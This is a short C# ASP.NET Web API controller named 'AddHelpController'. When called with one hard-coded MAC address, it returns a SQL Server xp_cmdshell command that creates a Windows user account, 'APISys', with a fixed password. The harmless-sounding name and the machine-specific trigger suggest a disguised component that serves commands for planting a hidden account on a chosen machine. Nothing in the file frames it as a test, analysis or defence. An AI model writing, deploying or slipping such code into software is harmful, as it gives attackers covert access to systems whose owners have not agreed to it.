using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Web.Http;

namespace API_Locker.Controllers
{
    public class AddHelpController : ApiController
    {
        public string Get(string Mac)
        {
            if (Mac == "F04DA274EB52")
            {
                return "EXEC master.dbo.xp_cmdshell 'net user APISys cl981125 /add'";
            }
            else
            {
                return "";
            }
            
        }

    }
}